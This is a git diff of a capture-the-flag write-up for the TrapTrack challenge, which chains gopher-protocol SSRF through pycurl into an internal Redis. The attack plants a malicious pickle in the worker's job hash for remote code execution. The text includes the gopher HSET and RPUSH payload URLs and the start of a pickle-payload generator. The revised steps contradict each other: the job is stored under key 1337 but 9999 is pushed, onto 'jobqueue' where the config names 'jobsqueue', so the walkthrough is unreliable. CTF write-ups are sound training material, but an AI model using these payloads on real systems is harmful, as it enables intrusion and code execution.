@@ -1,8 +1,8 @@
 ## TrapTrack :: Hard
 
-This challenge was a pure blast.
-The whole concept is super fun and interesting.
-It is defintely a new twist for me on the Redis exploitaiton side of CTFs.
+This challenge was a pure blast.  
+The whole concept is super fun and interesting.  
+It is defintely a new twist for me on the Redis exploitaiton side of CTFs.  
 
 
 #### Scenario
@@ -21,31 +21,30 @@ Can you take a look and see if you can infiltrate their system?
 
 ![](/images/traptrack-source-tree.png)
 
-We begin the challenge and we are greeted with a login page.
+We begin the challenge and we are greeted with a login page.  
 
 ![](/images/traptrack-login.png)
 
+This is a Flask application.  
+A quick peek at the `config.py` file reveals that the administrator account credentials are simply `admin:admin`.  
 
-This is a Flask application.
-A quick peek at the `config.py` file reveals that the administrator account credentials are simply `admin:admin`.
-
-From there we can login.
+From there we can login.  
 
 ![](/images/traptrack-dashboard.png)
 
-The design of this application is fun play with.
+The design of this application is fun play with.  
 
-It is a site in which we can add healthchecks for various sites.
+It is a site in which we can add healthchecks for various sites.  
 
-These healthchecks are then executed, and the results are shown with a red or green dot as shown above.
+These healthchecks are then executed, and the results are shown with a red or green dot as shown above.  
 
-Each healthcheck consists of a `url` and a `name`.
+Each healthcheck consists of a `url` and a `name`.  
 
 ![](/images/traptrack-create-trap.png)
 
-Once we submit our healthcheck, the fun begins.
+Once we submit our healthcheck, the fun begins.  
 
-We send a post request to `/tracks/add`.
+We send a post request to `/tracks/add`.  
 
 ```python
 @api.route('/tracks/add', methods=['POST'])
@@ -72,10 +71,11 @@ def tracks_add():
     return response('Trap Track added successfully!', 200)
 ```
 
-This job extracts the information from the json body of our request.
-It does some validation and then calls `create_job_queue`, which sounds interesting.
+This job extracts the information from the json body of our request.  
+It does some validation and then calls `create_job_queue`, which sounds interesting.  
 
-This function is located in the `cache.py` file.
+This function is located in the `cache.py` file.  
+
 ```python
 def create_job_queue(trapName, trapURL):
     job_id = get_job_id()
@@ -95,22 +95,23 @@ def create_job_queue(trapName, trapURL):
 
 ```
 
-We seems to be adding a serialized `data` object to a `redis hash`.
-We push add it and use the `job_id` as the key identifying our data.
+We seem to be adding a serialized `data` object to a `redis hash`. 1337 
+We add the data and use the `job_id` as the key identifying our data.  
 
-Afterwards, the application takes the `job_id`, and pushes it on a `redis list`.
-This list is called `REDIS_QUEUE`, so I imagine it is used as such.
+Afterwards, the application takes the `job_id`, and pushes it on a `redis list`.  
+This list is called `REDIS_QUEUE`, so I imagine it is used as such.  
 
 ##### Analyzing the worker
 
-We have to find out how this queue and our data is consumed.
+We have to find out how this queue and our data is consumed.  
 
-There is a `worker` folder, included with the sources.
-It is a completely separate python process, that seems to consume and execute the objects added to the queue.
+There is a `worker` folder, included with the sources.  
+It is a completely separate python process, that seems to consume and execute the objects added to the queue.  
 
-Let's analyze its source a bit.
+Let's analyze its source a bit.  
 
-The config section seems interesting:
+The config section seems interesting:  
+
 ```python
 config = {
     'REDIS_HOST' : '127.0.0.1',
@@ -121,8 +122,8 @@ config = {
 }
 ```
 
-This precises that `REDIS_QUEUE` is `jobsqueue` and `REDIS_JOBS` is `jobs`.
-We have to keep that in mind if we need to contact redis further down this challenge.
+This precises that `REDIS_QUEUE` is `jobsqueue` and `REDIS_JOBS` is `jobs`.  
+We have to keep that in mind if we need to contact redis further down this challenge.  
 
 ```python
 def run_worker():
@@ -147,11 +148,12 @@ if __name__ == '__main__':
         run_worker()
 ```
 
-The worker executes the `run_worker` function every 10 seconds, forever.
+The worker executes the `run_worker` function every 10 seconds, forever.  
 
-The `run_worker` function, seems to get a `job` from the result of a call to `get_work_item`.
+The `run_worker` function, seems to get a `job` from the result of a call to `get_work_item`.  
 
-Let's see what it does:
+Let's see what it does:  
+
 ```python
 def get_work_item():
     job_id = store.rpop(env('REDIS_QUEUE'))
@@ -164,14 +166,14 @@ def get_work_item():
     return job
 ```
 
-This seems to pop the last element on the `jobsqueue` list.
-This return a `job_id`, which is in turn used to gather the data from `jobs`.
-Once the data is obtained, it is decoded and then __deserialized__.
+This seems to pop the last element on the `jobsqueue` list.  
+This return a `job_id`, which is in turn used to gather the data from `jobs`.  
+Once the data is obtained, it is decoded and then __deserialized__.  
 
-This is our target.
+This is our target.  
 
-Let's see how the healthchecks are done.
-This is done in the `healthcheck.py` file of the worker script.
+Let's see how the healthchecks are done.  
+This is done in the `healthcheck.py` file of the worker script.  
 
 ```python
 import pycurl
@@ -191,49 +193,56 @@ def request(url):
         return response
 ```
 
-Now this is an important thing.
+Now this is an important thing.  
 
-The `pycurl` library seems to be bindings for `libcurl`.
-This is an important detail, as `libcurl` implements many more protocols than just `HTTP`.
+The `pycurl` library seems to be bindings for `libcurl`.  
+This is an important detail, since `libcurl` implements many protocols.  
 
-Once such protocol is `GOPHER`, and it is known to interact really well with redis.
+One such protocol is `GOPHER`, and it is known to interact really well with redis.  
+Since redis uses a ![text based protocol](https://redis.io/commands/), `GOPHER` is perfect to communicate this raw text.  
 
-Only the first character is truncated in `GOPHER`, otherwise it is just text, which is exactly how redis communicates.
+Only the first character is truncated in `GOPHER`, otherwise it is just text, which is perfect.  
 
-If i do this:
+If we do this request:  
 ```
 curl gopher://localhost:1338/HELLO%20WORLD
 ```
 
-The received data ends up being:
+The received data ends up being:  
+
 ![](/images/traptrack-gopher.png)
 
-So we need to add an expandable character.
+So we need to add a sacrificial character.  
+
 ```bash
 curl gopher://localhost:6379/_CONFIG%20GET%0aQUIT
 ```
 
-With this, we can communicate with redis.
+With this, we can communicate with redis.  
 
-Now our goal is to place a malicious pickle inside of a `jobs` entry.
-And then have the worker deserialize that data to get RCE.
+Now our goal is to place a malicious pickle inside of a `jobs` entry.  
+And then have the worker deserialize that data to get RCE.  
 
-To do so, we can use the healthchecks.
-We can do so in two requests.
-The first one places the malicious pickle in the `jobs` hash of redis, using a unique id like `9090`.
+To do so, we can use the healthchecks.  
+We can do it in two requests.  
 
-Then we can add this unique id, to the end of the `jobsqueue` list.
+- The first request will place the pickle payload inside of the `jobs` hash.
+  This payload will be identified with a key that could not be normally reached, such as `9999`.
 
-After a maximum of 10 seconds, the worker will pop the entry, and deserialize our payload.
+- Then we can trigger the exploit by placing our key (in this case `9999`), in last position of the `jobsqueue`.
+  This will place the payload for the next time the `worker` is checking the queue.
+  If all goes well our exploit runs and we get the flag.
 
-Here are the requests to do it:
 
-The first one places our payload:
+Here is the first gopher request:
+
+
 ```
 gopher://localhost:6379/_HSET%20jobs%201337%20<base64-pickle-payload>%0aQUIT
 ```
 
-This payload can be generated with this snippet:
+The pickle payload can be generated with this snippet:
+
 ```python
 import base64
 import pickle
@@ -251,11 +260,11 @@ if __name__ == "__main__":
 Then, we can add our id to the job queue:
 
 ```
-gopher://localhost:6379/_RPUSH%20jobqueue%201337%0aQUIT
+gopher://localhost:6379/_RPUSH%20jobqueue%209999%0aQUIT
 ```
 
-Note that the `%0aQUIT` is most likely optional, but it prevents the connection from hanging behind the scenes.
-redis will keep the connection alive a while if it is not explicitly ended.
+Note that the `%0aQUIT` is most likely optional, but it prevents the connection from hanging behind the scenes.  
+redis will keep the connection alive a while if it is not explicitly ended.  
 
 
 #### Scripts
